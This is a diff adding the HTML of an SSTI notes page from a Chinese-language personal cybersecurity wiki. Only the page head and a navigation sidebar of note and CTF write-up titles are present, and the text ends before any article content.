@@ -1,0 +1,2807 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../SSRF/">
+      
+      
+        <link rel="next" href="../Struct2/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.1">
+    
+    
+      
+        <title>SSTI - Lengkur's Wiki</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    <body dir="ltr">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#flask" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../.." title="Lengkur&#39;s Wiki" class="md-header__button md-logo" aria-label="Lengkur's Wiki" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Lengkur's Wiki
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              SSTI
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  🐧 Lengkur's Cyber Space
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../%2A/" class="md-tabs__link">
+        
+  
+  
+    
+  
+  *
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Notes
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../wp/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Wp
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Lengkur&#39;s Wiki" class="md-nav__button md-logo" aria-label="Lengkur's Wiki" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Lengkur's Wiki
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    🐧 Lengkur's Cyber Space
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../%2A/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    *
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Notes
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Notes
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Flask/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Flask
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQL%E6%B3%A8%E5%85%A5/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SQL注入
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SSRF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSRF
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSTI
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSTI
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#flask" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        FLASK
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="FLASK">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        常用模块和类
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        绕过
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Struct2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Struct2
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XSS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XSS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../http/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Http
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Php命令执行
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../php%E7%89%B9%E6%80%A7/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Php特性
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    反序列化
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    文件上传
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    文件包含
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../wp/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Wp
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_4" id="__nav_4_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Wp
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_2" id="__nav_4_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    NSS 工坊web基础入门
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    NSS 工坊web基础入门
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/NSS%20%E5%B7%A5%E5%9D%8Aweb%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/P10/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    P10
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/NSS%20%E5%B7%A5%E5%9D%8Aweb%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/P3/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    P3
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/NSS%20%E5%B7%A5%E5%9D%8Aweb%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/P4/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    P4
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/NSS%20%E5%B7%A5%E5%9D%8Aweb%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/P5/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    P5
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/NSS%20%E5%B7%A5%E5%9D%8Aweb%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/P7/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    P7
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_3" id="__nav_4_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    NSSCTF WEB
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    NSSCTF WEB
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/NSSCTF%20WEB/%5BDe1ctf%202019%5DSSRF%20Me-Flask/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    [De1ctf 2019]SSRF Me Flask
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/NSSCTF%20WEB/%5BMoeCTF%202021%5DbabyRCE/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    [MoeCTF 2021]babyRCE
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/NSSCTF%20WEB/%5BNISACTF%202022%5Dbingdundun~-phar%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-phar%E4%BC%AA%E5%8D%8F%E8%AE%AE/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    [NISACTF 2022]bingdundun~ phar文件上传 phar伪协议
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/NSSCTF%20WEB/%5BNISACTF%202022%5Dlevel-up~robots-md5%E5%BC%BA%E7%A2%B0%E6%92%9E-sha1%E5%BC%BA%E7%A2%B0%E6%92%9E-php%E5%8F%98%E9%87%8F%E8%A7%A3%E6%9E%90%E7%BB%95%E8%BF%87-create_function%E7%BB%95%E8%BF%87/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    [NISACTF 2022]level up~robots md5强碰撞 sha1强碰撞 php变量解析绕过 create function绕过
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/NSSCTF%20WEB/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5Dez_sql-%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87-%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    [SWPUCTF 2022 新生赛]ez sql 双写绕过 空格绕过
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/NSSCTF%20WEB/%5BWUSTCTF%202020%5D%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-MD5%E5%BC%B1%E6%AF%94%E8%BE%83-intval%E7%89%B9%E6%80%A7-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    [WUSTCTF 2020]朴实无华 信息搜集 MD5弱比较 intval特性 命令执行 空格绕过
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/NSSCTF%20WEB/%5B%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%5D%E9%9A%8F%E4%BE%BF%E6%B3%A8-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-%E5%81%B7%E6%A2%81%E6%8D%A2%E6%9F%B1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    [强网杯 2019]随便注 堆叠注入 偷梁换柱
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/NSSCTF%20WEB/%5B%E9%B9%A4%E5%9F%8E%E6%9D%AF%202021%5DMiddle%20magic-php%E7%89%B9%E6%80%A7-%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87-%E5%BC%B1%E6%AF%94%E8%BE%83/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    [鹤城杯 2021]Middle magic php特性 数组绕过 弱比较
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_4" id="__nav_4_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    NSS星辰大海
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    NSS星辰大海
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/NSS%E6%98%9F%E8%BE%B0%E5%A4%A7%E6%B5%B7/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Phar反序列化
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/NSS%E6%98%9F%E8%BE%B0%E5%A4%A7%E6%B5%B7/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Session反序列化
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/NSS%E6%98%9F%E8%BE%B0%E5%A4%A7%E6%B5%B7/%E5%8F%8C%E5%86%99%24/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    双写$
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_5" id="__nav_4_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Ctfshow
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Ctfshow
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/ctfshow/web102-php%E7%89%B9%E6%80%A7-php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%86%99%E5%85%A5%E6%9C%A8%E9%A9%AC/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    web102-php特性-php伪协议写入木马
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/ctfshow/web160-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-.user.ini%2B%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    web160-文件上传-.user.ini+日志包含
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/ctfshow/web161-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-.user.ini%2B%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web161 文件上传 .user.ini+远程文件包含
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/ctfshow/web171-SQL%E6%B3%A8%E5%85%A5-%E8%81%94%E5%90%88/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    web171-SQL注入-联合
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../wp/ctfshow/web21-%E7%88%86%E7%A0%B4-payload%E5%A4%84%E7%90%86/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    web21-爆破-payload处理
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
